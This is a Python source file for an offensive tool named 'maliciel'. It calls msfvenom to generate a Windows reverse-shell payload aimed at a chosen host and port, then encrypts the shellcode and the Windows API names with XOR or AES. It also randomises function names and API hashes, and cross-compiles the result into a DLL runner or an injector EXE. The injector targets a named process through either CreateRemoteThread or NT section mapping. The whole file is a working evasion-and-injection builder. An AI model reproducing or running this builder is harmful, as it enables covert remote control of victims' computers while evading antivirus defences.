# payload encryption functions
import argparse
import subprocess
import sys
import random
import os
import hashlib
import string
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class malicielEncryptor():
    def __init__(self):
        self.XOR_PAYLOAD = self.random()
        self.XOR_FUNC = self.random()
        self.XOR_PROC = self.random()
        self.XOR_DLL = self.random()
        self.PAYLOAD_KEY = self.random()

    def payload_key(self):
        return self.XOR_PAYLOAD

    def func_key(self):
        return self.XOR_FUNC
    
    def aes_key(self):
        return self.random_bytes()

    def proc_key(self):
        return self.XOR_PROC

    def dll_key(self):
        return self.XOR_DLL

    def xor(self, data, key):
        key = str(key)
        l = len(key)
        output_str = ""

        for i in range(len(data)):
            current = data[i]
            current_key = key[i % len(key)]
            ordd = lambda x: x if isinstance(x, int) else ord(x)
            output_str += chr(ordd(current) ^ ord(current_key))

        return output_str
    
    # AES encryption
    # key is randomized (16 bytes random string),
    # and the key is then transform into the SHA256 hash and
    # then it is used as a key for encrypting plaintext
    def aes_encrypt(self, plaintext, key):
        k = hashlib.sha256(key).digest()
        iv = 16 * '\x00'
        plaintext = self.pad(plaintext)
        cipher = AES.new(k, AES.MODE_CBC, iv.encode("UTF-8"))
        ciphertext = cipher.encrypt(plaintext.encode("UTF-8"))
        ciphertext, key = self.convert(ciphertext), self.convert(key)
        ciphertext = '{' + (' 0x'.join(x + "," for x in ciphertext)).strip(",") + ' };'
        key = '{' + (' 0x'.join(x + "," for x in key)).strip(",") + ' };'
        return ciphertext, key
    
    # AES encryption
    # key is randomized (16 bytes random string),
    # and the key is then transform into the SHA256 hash and
    # then it is used as a key for encrypting plaintext
    def aes_encrypt_nt(self, plaintext, key):
        k = hashlib.sha256(key).digest()
        iv = 16 * b'\x00'
        plaintext = pad(plaintext, AES.block_size)
        cipher = AES.new(k, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(plaintext)
        ciphertext, key = self.convert(ciphertext), self.convert(key)
        ciphertext = '{' + (' 0x'.join(x + "," for x in ciphertext)).strip(",") + ' };'
        key = '{' + (' 0x'.join(x + "," for x in key)).strip(",") + ' };'
        # print (ciphertext, key)
        return ciphertext, key
    
    def pad(self, s):
        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
    
    def convert(self, data):
        output_str = ""
        for i in range(len(data)):
            current = data[i]
            ordd = lambda x: x if isinstance(x, int) else ord(x)
            output_str += hex(ordd(current))
        return output_str.split("0x")

    def xor_encrypt(self, data, key):
        ciphertext = self.xor(data, key)
        ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
        return ciphertext, key

    def random(self):
        length = random.randint(16, 32)
        return ''.join(random.choice(string.ascii_letters) for i in range(length))
    
    def random_bytes(self):
        return get_random_bytes(16)
    
class malicielHasher():
    def hashing(self, data):
        hash = 0x35
        for i in range(0, len(data)):
            hash += ord(data[i]) + (hash << 1)
        return hash

def generate_payload(host, port):
    print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
    msfv = "msfvenom -p windows/x64/shell_reverse_tcp"
    msfv += " LHOST=" + host
    msfv += " LPORT=" + port
    msfv += " -f raw"
    msfv += " -o /tmp/hack.bin"
    print (Colors.YELLOW + msfv + Colors.ENDC)
    try:
        p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
        p.wait()
        print (Colors.GREEN + "reverse shell payload successfully generated :)" + Colors.ENDC)
    except Exception as e:
        print (Colors.RED + "generate payload failed :(" + Colors.ENDC)
        sys.exit()

def run_maliciel(host, port, build, encryption, proc_name, mode):
    banner = """
    #   #   #   #     #####  #### ##### ##### #
    ## ##  # #  #       #   #       #   #     #
    # # # #   # #       #   #       #   ###   #
    #   # ##### #       #   #       #   #     #
    #   # #   # #       #   #       #   #     #
    #   # #   # ##### #####  #### ##### ##### ##### 
    """
    print (Colors.BLUE + banner + Colors.ENDC)
    generate_payload(host, port)
    encryptor = malicielEncryptor()
    hasher = malicielHasher()
    print (Colors.BLUE + "read payload..." + Colors.ENDC)
    plaintext = open("/tmp/hack.bin", "rb").read()

    print (Colors.BLUE + "build " + build + "..." + Colors.ENDC)
    if build == '1':
        f_va = "VirtualAlloc"
        f_vp = "VirtualProtect"
        f_cth = "CreateThread"
        f_wfso = "WaitForSingleObject"
        f_rmm = "RtlMoveMemory"
        f_rce = "RunRCE"
        f_xor = "XOR"
        f_aes = "AESDecrypt" 

        print (Colors.BLUE + "encrypt..." + Colors.ENDC)
        if encryption == '1':
            f_rce, f_xor, ciphertext, p_key, ciphertext_va, va_key, ciphertext_vp, vp_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, ciphertext_rmm, rmm_key = dllEncryptXOR(encryptor, plaintext, f_va, f_vp, f_cth, f_wfso, f_rmm)
        
            # kernel32_hash = hasher.hashing("kernel32.dll")
            # getmodulehandle_hash = hasher.hashing("GetModuleHandleA")
            # getprocaddress_hash = hasher.hashing("GetProcAddress")

            tmp = open("templates/maliciel_xor.cpp", "rt")
            data = tmp.read()

            data = dllDataReplaceXOR(f_rce, f_xor, ciphertext, p_key, ciphertext_va, va_key, ciphertext_vp, vp_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, ciphertext_rmm, rmm_key, data)

            # print (Colors.BLUE + "calculating win API hashes..." + Colors.ENDC)
            # data = data.replace('#define KERNEL32_HASH 0x00000000', '#define KERNEL32_HASH ' + str(kernel32_hash))
            # data = data.replace('#define GETMODULEHANDLE_HASH 0x00000000', '#define GETMODULEHANDLE_HASH ' + str(getmodulehandle_hash))
            # data = data.replace('#define GETPROCADDRESS_HASH 0x00000000', '#define GETPROCADDRESS_HASH ' + str(getprocaddress_hash))

            tmp.close()
            try:
                tmp = open("maliciel-enc.cpp", "w+")
                tmp.write(data)
                tmp.close()
            except:
                print (Colors.RED + "error generating template :(" + Colors.ENDC)
                sys.exit() 
            
        elif encryption == '2':
            f_rce, f_xor, ciphertext, p_key, ciphertext_va, va_key, ciphertext_vp, vp_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, ciphertext_rmm, rmm_key = dllEncryptAES(encryptor, plaintext, f_va, f_vp, f_cth, f_wfso, f_rmm)

            tmp = open("templates/maliciel_aes.cpp", "rt")
            data = tmp.read()

            data = dllDataReplaceAES(f_rce, f_xor, f_aes, ciphertext, p_key, ciphertext_va, va_key, ciphertext_vp, vp_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, ciphertext_rmm, rmm_key, data)

            tmp.close()
            try:
                tmp = open("maliciel-enc.cpp", "w+")
                tmp.write(data)
                tmp.close()
            except:
                print (Colors.RED + "error generating template :(" + Colors.ENDC)
                sys.exit() 
        
        print (Colors.GREEN + "successfully encrypt template file :)" + Colors.ENDC)

        print (Colors.BLUE + "compiling..." + Colors.ENDC)
        try:
            cmd = "x86_64-w64-mingw32-g++ -shared -o maliciel.dll maliciel-enc.cpp -fpermissive >/dev/null"
            subprocess.run([cmd], check = True)
            os.remove("maliciel-enc.cpp")
        except:
            os.remove("maliciel-enc.cpp")
            print (Colors.RED + "error compiling template :(" + Colors.ENDC)
            sys.exit()
        else:
            print (Colors.YELLOW + cmd + Colors.ENDC)
            print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
            print (Colors.GREEN + "rundll32 .\maliciel.dll, " + f_rce)

    elif build == '2':
        f_vaex = "VirtualAllocEx"
        f_op = "OpenProcess"
        f_cth = "CreateRemoteThread"
        f_wfso = "WaitForSingleObject"
        f_wpm = "WriteProcessMemory"
        f_clh = "CloseHandle"
        f_p32f = "Process32First"
        f_p32n = "Process32Next"
        f_ct32s = "CreateToolhelp32Snapshot"

        f_xor = "XOR"
        f_inj = "Inject("
        f_ftm = "findMyProc"
        f_ftt = "FindTarget"
        f_aes = "AESDecrypt("

        k32_name = "kernel32"

        print (Colors.BLUE + "process name: " + proc_name + "..." + Colors.ENDC)
        print (Colors.BLUE + "encrypt..." + Colors.ENDC)
        if encryption == '1':
            f_xor, ciphertext, p_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, f_inj, f_ftm, ciphertext_vaex, vaex_key, ciphertext_wpm, wpm_key, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_op, op_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key = peEncryptXOR(proc_name, encryptor, plaintext, f_cth, f_wfso, f_vaex, f_op, f_wpm, f_clh, f_p32f, f_p32n, f_ct32s, k32_name)

            kernel32_hash = hasher.hashing("kernel32.dll")
            getmodulehandle_hash = hasher.hashing("GetModuleHandleA")
            getprocaddress_hash = hasher.hashing("GetProcAddress")

            tmp = open("templates/maliciel_inj_xor.cpp", "rt")
            data = tmp.read()

            data = peDataReplaceXOR(mode, f_xor, ciphertext, p_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, data, f_inj, f_ftm, ciphertext_vaex, vaex_key, ciphertext_wpm, wpm_key, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_op, op_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key, kernel32_hash, getmodulehandle_hash, getprocaddress_hash)

            tmp.close()
            try:
                tmp = open("maliciel-enc.cpp", "w+")
                tmp.write(data)
                tmp.close()
            except:
                print (Colors.RED + "error generating template :(" + Colors.ENDC)
                sys.exit() 

        elif encryption == '2':
            f_xor, f_aes, ciphertext, p_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, f_inj, f_ftt, ciphertext_vaex, vaex_key, ciphertext_wpm, wpm_key, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_op, op_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key = peEncryptAES(proc_name, encryptor, plaintext, f_cth, f_wfso, f_vaex, f_op, f_wpm, f_clh, f_p32f, f_p32n, f_ct32s, k32_name)

            tmp = open("templates/maliciel_inj_aes.cpp", "rt")
            data = tmp.read()

            data = peDataReplaceAES(mode, f_xor, f_aes, ciphertext, p_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, data, f_inj, f_ftt, ciphertext_vaex, vaex_key, ciphertext_wpm, wpm_key, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_op, op_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key)

            tmp.close()
            try:
                tmp = open("maliciel-enc.cpp", "w+")
                tmp.write(data)
                tmp.close()
            except:
                print (Colors.RED + "error generating template :(" + Colors.ENDC)
                sys.exit() 

        print (Colors.GREEN + "successfully encrypt template file :)" + Colors.ENDC)
        print (Colors.BLUE + "compiling..." + Colors.ENDC)
        try:
            cmd = "x86_64-w64-mingw32-gcc -O2 maliciel-enc.cpp -o maliciel.exe -m" + mode + " -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null"
            subprocess.run([cmd], check = True)
            os.remove("maliciel-enc.cpp")
        except:
            os.remove("maliciel-enc.cpp")
            print (Colors.RED + "error compiling template :(" + Colors.ENDC)
            sys.exit()
        else:
            print (Colors.YELLOW + cmd + Colors.ENDC)
            print (Colors.GREEN + "successfully compiled maliciel.exe :)" + Colors.ENDC)

    elif build == '3':
        f_ntop = "NtOpenProcess"
        f_ntcs = "NtCreateSection"
        f_ntmvos = "NtMapViewOfSection"
        f_wfso = "WaitForSingleObject"
        f_rcut = "RtlCreateUserThread"
        f_clh = "CloseHandle"
        f_p32f = "Process32First"
        f_p32n = "Process32Next"
        f_ct32s = "CreateToolhelp32Snapshot"
        f_zw = "ZwUnmapViewOfSection"

        f_xor = "XOR("
        f_ftm = "findMyProc"
        f_aes = "AESDecrypt("
        f_cmh = "calcMyHash"
        f_cmhb = "calcMyHashBase"
        f_gk32 = "getKernel32"


        k32_name = "kernel32"
        ntdll_name = "ntdll"

        print (Colors.BLUE + "process name: " + proc_name + "..." + Colors.ENDC)
        print (Colors.BLUE + "encrypt..." + Colors.ENDC)
        
        if encryption == '1':
            f_xor, ciphertext, p_key, ciphertext_wfso, wfso_key, f_ftm, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key, ciphertext_ntop, ntop_key, ciphertext_ntcs, ntcs_key, ciphertext_ntmvos, ntmvos_key, ciphertext_rcut, rcut_key, ciphertext_zw, zw_key, ciphertext_ntd, ntd_key = ntEncryptXOR(proc_name, encryptor, plaintext, f_wfso, f_clh, f_p32f, f_p32n, f_ct32s, k32_name, f_ntop, f_ntcs, f_ntmvos, f_rcut, f_zw, ntdll_name)

            kernel32_hash = hasher.hashing("kernel32.dll")
            getmodulehandle_hash = hasher.hashing("GetModuleHandleA")
            getprocaddress_hash = hasher.hashing("GetProcAddress")

            tmp = open("templates/maliciel_nt_xor.cpp", "rt")
            data = tmp.read()

            data = ntDataReplaceXOR(mode, f_xor, ciphertext, p_key, ciphertext_wfso, wfso_key, data, f_ftm, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key, kernel32_hash, getmodulehandle_hash, getprocaddress_hash, ciphertext_ntop, ntop_key, ciphertext_ntcs, ntcs_key, ciphertext_ntmvos, ntmvos_key, ciphertext_rcut, rcut_key, ciphertext_zw, zw_key, ciphertext_ntd, ntd_key)

            tmp.close()
            try:
                tmp = open("maliciel-enc.cpp", "w+")
                tmp.write(data)
                tmp.close()
            except:
                print (Colors.RED + "error generating template :(" + Colors.ENDC)
                sys.exit() 

        elif encryption == '2':
            f_xor, f_aes, ciphertext, p_key, ciphertext_wfso, wfso_key, f_ftt, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key, f_cmh, f_cmhb, f_gk32, ciphertext_ntop, ntop_key, ciphertext_ntcs, ntcs_key, ciphertext_ntmvos, ntmvos_key, ciphertext_rcut, rcut_key, ciphertext_zw, zw_key, ciphertext_ntd, ntd_key = ntEncryptAES(proc_name, encryptor, plaintext, f_wfso, f_clh, f_p32f, f_p32n, f_ct32s, k32_name, f_ntop, f_ntcs, f_ntmvos, f_rcut, f_zw, ntdll_name)
            
            kernel32_hash = hasher.hashing("kernel32.dll")
            getmodulehandle_hash = hasher.hashing("GetModuleHandleA")
            getprocaddress_hash = hasher.hashing("GetProcAddress")
            loadlibrarya_hash = hasher.hashing("LoadLibraryA")

            tmp = open("templates/maliciel_nt_aes.cpp", "rt")
            data = tmp.read()

            data = ntDataReplaceAES(mode, f_xor, f_aes, ciphertext, p_key, ciphertext_wfso, wfso_key, data, f_ftt, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key, kernel32_hash, getmodulehandle_hash, getprocaddress_hash, f_cmh, f_cmhb, f_gk32, ciphertext_ntop, ntop_key, ciphertext_ntcs, ntcs_key, ciphertext_ntmvos, ntmvos_key, ciphertext_rcut, rcut_key, ciphertext_zw, zw_key, ciphertext_ntd, ntd_key, loadlibrarya_hash)

            tmp.close()
            try:
                tmp = open("maliciel-enc.cpp", "w+")
                tmp.write(data)
                tmp.close()
            except:
                print (Colors.RED + "error generating template :(" + Colors.ENDC)
                sys.exit() 

        print (Colors.GREEN + "successfully encrypt template file :)" + Colors.ENDC)

        print (Colors.BLUE + "compiling..." + Colors.ENDC)
        try:
            cmd = "x86_64-w64-mingw32-g++ -O2 maliciel-enc.cpp -o maliciel.exe -m" + mode + " -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null"
            subprocess.run([cmd], check = True)
            os.remove("maliciel-enc.cpp")
        except:
            os.remove("maliciel-enc.cpp")
            print (Colors.RED + "error compiling template :(" + Colors.ENDC)
            sys.exit()
        else:
            print (Colors.YELLOW + cmd + Colors.ENDC)
            print (Colors.GREEN + "successfully compiled maliciel.exe :)" + Colors.ENDC)

def ntDataReplaceAES(mode, f_xor, f_aes, ciphertext, p_key, ciphertext_wfso, wfso_key, data, f_ftt, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key, kernel32_hash, getmodulehandle_hash, getprocaddress_hash, f_cmh, f_cmhb, f_gk32, ciphertext_ntop, ntop_key, ciphertext_ntcs, ntcs_key, ciphertext_ntmvos, ntmvos_key, ciphertext_rcut, rcut_key, ciphertext_zw, zw_key, ciphertext_ntd, ntd_key, loadlibrarya_hash):
    data = data.replace('unsigned char my_payload[] = { };', 'unsigned char my_payload[] = ' + ciphertext)
    data = data.replace('unsigned char s_ntop[] = { };', 'unsigned char s_ntop[] = ' + ciphertext_ntop)
    data = data.replace('unsigned char s_ntcs[] = { };', 'unsigned char s_ntcs[] = ' + ciphertext_ntcs)
    data = data.replace('unsigned char s_wfso[] = { };', 'unsigned char s_wfso[] = ' + ciphertext_wfso)
    data = data.replace('unsigned char s_ntmvos[] = { };', 'unsigned char s_ntmvos[] = ' + ciphertext_ntmvos)
    data = data.replace('unsigned char s_zw[] = { };', 'unsigned char s_zw[] = ' + ciphertext_zw)
    data = data.replace('unsigned char s_rcut[] = { };', 'unsigned char s_rcut[] = ' + ciphertext_rcut)
    data = data.replace('unsigned char s_clh[] = { };', 'unsigned char s_clh[] = ' + ciphertext_clh)
    data = data.replace('unsigned char s_p32f[] = { };', 'unsigned char s_p32f[] = ' + ciphertext_p32f)
    data = data.replace('unsigned char s_p32n[] = { };', 'unsigned char s_p32n[] = ' + ciphertext_p32n)
    data = data.replace('unsigned char s_ct32s[] = { };', 'unsigned char s_ct32s[] = ' + ciphertext_ct32s)
    data = data.replace('unsigned char my_proc[] = { };', 'unsigned char my_proc[] = ' + ciphertext_proc)
    data = data.replace('unsigned char s_k32[] = { };', 'unsigned char s_k32[] = ' + ciphertext_k32)
    data = data.replace('unsigned char s_ntd[] = { };', 'unsigned char s_ntd[] = ' + ciphertext_ntd)

    data = data.replace('unsigned char my_payload_key[] = "";', 'unsigned char my_payload_key[] = ' + p_key)
    data = data.replace('char my_proc_key[] = "";', 'char my_proc_key[] = "' + proc_key + '";')
    data = data.replace('char s_ntop_key[] = "";', 'char s_ntop_key[] = "' + ntop_key + '";')
    data = data.replace('char s_ntcs_key[] = "";', 'char s_ntcs_key[] = "' + ntcs_key + '";')
    data = data.replace('char s_ntmvos_key[] = "";', 'char s_ntmvos_key[] = "' + ntmvos_key + '";')
    data = data.replace('char s_zw_key[] = "";', 'char s_zw_key[] = "' + zw_key + '";')
    data = data.replace('char s_rcut_key[] = "";', 'char s_rcut_key[] = "' + rcut_key + '";')
    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = "' + wfso_key + '";')
    data = data.replace('char s_clh_key[] = "";', 'char s_clh_key[] = "' + clh_key + '";')
    data = data.replace('char s_p32f_key[] = "";', 'char s_p32f_key[] = "' + p32f_key + '";')
    data = data.replace('char s_p32n_key[] = "";', 'char s_p32n_key[] = "' + p32n_key + '";')
    data = data.replace('char s_ct32s_key[] = "";', 'char s_ct32s_key[] = "' + ct32s_key + '";')
    data = data.replace('char k32_key[] = "";', 'char k32_key[] = "' + k32_key + '";')
    data = data.replace('char ntd_key[] = "";', 'char ntd_key[] = "' + ntd_key + '";')
    data = data.replace('XOR(', f_xor + "(")
    data = data.replace('AESDecrypt(', f_aes + "(")
    data = data.replace("findMyProc(", f_ftt + "(")
    data = data.replace("calcMyHash(", f_cmh + "(")
    data = data.replace("calcMyHashBase(", f_cmhb + "(")
    data = data.replace("getKernel32(", f_gk32 + "(")

    print (Colors.BLUE + "calculating win API hashes..." + Colors.ENDC)
    data = data.replace('#define KERNEL32_HASH 0x00000000', '#define KERNEL32_HASH ' + str(kernel32_hash))
    data = data.replace('#define GETMODULEHANDLE_HASH 0x00000000', '#define GETMODULEHANDLE_HASH ' + str(getmodulehandle_hash))
    data = data.replace('#define GETPROCADDRESS_HASH 0x00000000', '#define GETPROCADDRESS_HASH ' + str(getprocaddress_hash))
    data = data.replace('#define LOADLIBRARY_HASH 0x00000000', '#define LOADLIBRARY_HASH ' + str(loadlibrarya_hash))

    if mode == "console":
        data = data.replace("int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {", "int main(void) {")
    return data

def ntEncryptAES(proc_name, encryptor, plaintext, f_wfso, f_clh, f_p32f, f_p32n, f_ct32s, k32_name, f_ntop, f_ntcs, f_ntmvos, f_rcut, f_zw, ntdll_name):
    f_xor, f_ftt, f_aes = encryptor.random(), encryptor.random(), encryptor.random()
    f_cmh, f_cmhb, f_gk32 = encryptor.random(), encryptor.random(), encryptor.random()
    ciphertext, p_key = encryptor.aes_encrypt_nt(plaintext, encryptor.aes_key())
    ciphertext_ntop, ntop_key = encryptor.xor_encrypt(f_ntop, encryptor.func_key())
    ciphertext_ntcs, ntcs_key = encryptor.xor_encrypt(f_ntcs, encryptor.func_key())
    ciphertext_ntmvos, ntmvos_key = encryptor.xor_encrypt(f_ntmvos, encryptor.func_key())
    ciphertext_rcut, rcut_key = encryptor.xor_encrypt(f_rcut, encryptor.func_key())
    ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
    ciphertext_clh, clh_key = encryptor.xor_encrypt(f_clh, encryptor.func_key())
    ciphertext_p32f, p32f_key = encryptor.xor_encrypt(f_p32f, encryptor.func_key())
    ciphertext_p32n, p32n_key = encryptor.xor_encrypt(f_p32n, encryptor.func_key())
    ciphertext_zw, zw_key = encryptor.xor_encrypt(f_zw, encryptor.func_key())
    ciphertext_ct32s, ct32s_key = encryptor.xor_encrypt(f_ct32s, encryptor.func_key())
    ciphertext_proc, proc_key = encryptor.xor_encrypt(proc_name, encryptor.proc_key())
    ciphertext_k32, k32_key = encryptor.xor_encrypt(k32_name, encryptor.dll_key())
    ciphertext_ntd, ntd_key = encryptor.xor_encrypt(ntdll_name, encryptor.dll_key())
    return f_xor,f_aes,ciphertext,p_key,ciphertext_wfso,wfso_key,f_ftt,ciphertext_clh,clh_key,ciphertext_p32f,p32f_key,ciphertext_p32n,p32n_key,ciphertext_ct32s,ct32s_key,ciphertext_proc,proc_key,ciphertext_k32,k32_key,f_cmh,f_cmhb,f_gk32,ciphertext_ntop,ntop_key,ciphertext_ntcs,ntcs_key,ciphertext_ntmvos,ntmvos_key,ciphertext_rcut,rcut_key,ciphertext_zw,zw_key,ciphertext_ntd,ntd_key

def ntDataReplaceXOR(mode, f_xor, ciphertext, p_key, ciphertext_wfso, wfso_key, data, f_ftm, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key, kernel32_hash, getmodulehandle_hash, getprocaddress_hash, ciphertext_ntop, ntop_key, ciphertext_ntcs, ntcs_key, ciphertext_ntmvos, ntmvos_key, ciphertext_rcut, rcut_key, ciphertext_zw, zw_key, ciphertext_ntd, ntd_key):
    data = data.replace('unsigned char my_payload[] = { };', 'unsigned char my_payload[] = ' + ciphertext)
    data = data.replace('unsigned char s_ntop[] = { };', 'unsigned char s_ntop[] = ' + ciphertext_ntop)
    data = data.replace('unsigned char s_ntcs[] = { };', 'unsigned char s_ntcs[] = ' + ciphertext_ntcs)
    data = data.replace('unsigned char s_wfso[] = { };', 'unsigned char s_wfso[] = ' + ciphertext_wfso)
    data = data.replace('unsigned char s_ntmvos[] = { };', 'unsigned char s_ntmvos[] = ' + ciphertext_ntmvos)
    data = data.replace('unsigned char s_zw[] = { };', 'unsigned char s_zw[] = ' + ciphertext_zw)
    data = data.replace('unsigned char s_rcut[] = { };', 'unsigned char s_rcut[] = ' + ciphertext_rcut)
    data = data.replace('unsigned char s_clh[] = { };', 'unsigned char s_clh[] = ' + ciphertext_clh)
    data = data.replace('unsigned char s_p32f[] = { };', 'unsigned char s_p32f[] = ' + ciphertext_p32f)
    data = data.replace('unsigned char s_p32n[] = { };', 'unsigned char s_p32n[] = ' + ciphertext_p32n)
    data = data.replace('unsigned char s_ct32s[] = { };', 'unsigned char s_ct32s[] = ' + ciphertext_ct32s)
    data = data.replace('unsigned char my_proc[] = { };', 'unsigned char my_proc[] = ' + ciphertext_proc)
    data = data.replace('unsigned char s_k32[] = { };', 'unsigned char s_k32[] = ' + ciphertext_k32)
    data = data.replace('unsigned char s_ntd[] = { };', 'unsigned char s_ntd[] = ' + ciphertext_ntd)

    data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
    data = data.replace('char my_proc_key[] = "";', 'char my_proc_key[] = "' + proc_key + '";')
    data = data.replace('char s_ntop_key[] = "";', 'char s_ntop_key[] = "' + ntop_key + '";')
    data = data.replace('char s_ntcs_key[] = "";', 'char s_ntcs_key[] = "' + ntcs_key + '";')
    data = data.replace('char s_ntmvos_key[] = "";', 'char s_ntmvos_key[] = "' + ntmvos_key + '";')
    data = data.replace('char s_zw_key[] = "";', 'char s_zw_key[] = "' + zw_key + '";')
    data = data.replace('char s_rcut_key[] = "";', 'char s_rcut_key[] = "' + rcut_key + '";')
    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = "' + wfso_key + '";')
    data = data.replace('char s_clh_key[] = "";', 'char s_clh_key[] = "' + clh_key + '";')
    data = data.replace('char s_p32f_key[] = "";', 'char s_p32f_key[] = "' + p32f_key + '";')
    data = data.replace('char s_p32n_key[] = "";', 'char s_p32n_key[] = "' + p32n_key + '";')
    data = data.replace('char s_ct32s_key[] = "";', 'char s_ct32s_key[] = "' + ct32s_key + '";')
    data = data.replace('char k32_key[] = "";', 'char k32_key[] = "' + k32_key + '";')
    data = data.replace('char ntd_key[] = "";', 'char ntd_key[] = "' + ntd_key + '";')
    data = data.replace('XOR(', f_xor + "(")
    data = data.replace("findMyProc(", f_ftm + "(")

    print (Colors.BLUE + "calculating win API hashes..." + Colors.ENDC)
    data = data.replace('#define KERNEL32_HASH 0x00000000', '#define KERNEL32_HASH ' + str(kernel32_hash))
    data = data.replace('#define GETMODULEHANDLE_HASH 0x00000000', '#define GETMODULEHANDLE_HASH ' + str(getmodulehandle_hash))
    data = data.replace('#define GETPROCADDRESS_HASH 0x00000000', '#define GETPROCADDRESS_HASH ' + str(getprocaddress_hash))

    if mode == "console":
        data = data.replace("int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {", "int main(void) {")
    return data

def ntEncryptXOR(proc_name, encryptor, plaintext, f_wfso, f_clh, f_p32f, f_p32n, f_ct32s, k32_name, f_ntop, f_ntcs, f_ntmvos, f_rcut, f_zw, ntdll_name):
    f_xor, f_ftm = encryptor.random(), encryptor.random()
    ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
    ciphertext_ntop, ntop_key = encryptor.xor_encrypt(f_ntop, encryptor.func_key())
    ciphertext_ntcs, ntcs_key = encryptor.xor_encrypt(f_ntcs, encryptor.func_key())
    ciphertext_ntmvos, ntmvos_key = encryptor.xor_encrypt(f_ntmvos, encryptor.func_key())
    ciphertext_rcut, rcut_key = encryptor.xor_encrypt(f_rcut, encryptor.func_key())
    ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
    ciphertext_clh, clh_key = encryptor.xor_encrypt(f_clh, encryptor.func_key())
    ciphertext_p32f, p32f_key = encryptor.xor_encrypt(f_p32f, encryptor.func_key())
    ciphertext_p32n, p32n_key = encryptor.xor_encrypt(f_p32n, encryptor.func_key())
    ciphertext_zw, zw_key = encryptor.xor_encrypt(f_zw, encryptor.func_key())
    ciphertext_ct32s, ct32s_key = encryptor.xor_encrypt(f_ct32s, encryptor.func_key())
    ciphertext_proc, proc_key = encryptor.xor_encrypt(proc_name, encryptor.proc_key())
    ciphertext_k32, k32_key = encryptor.xor_encrypt(k32_name, encryptor.dll_key())
    ciphertext_ntd, ntd_key = encryptor.xor_encrypt(ntdll_name, encryptor.dll_key())
    return f_xor,ciphertext,p_key,ciphertext_wfso,wfso_key,f_ftm,ciphertext_clh,clh_key,ciphertext_p32f,p32f_key,ciphertext_p32n,p32n_key,ciphertext_ct32s,ct32s_key,ciphertext_proc,proc_key,ciphertext_k32,k32_key,ciphertext_ntop,ntop_key,ciphertext_ntcs,ntcs_key,ciphertext_ntmvos,ntmvos_key,ciphertext_rcut,rcut_key,ciphertext_zw,zw_key,ciphertext_ntd,ntd_key

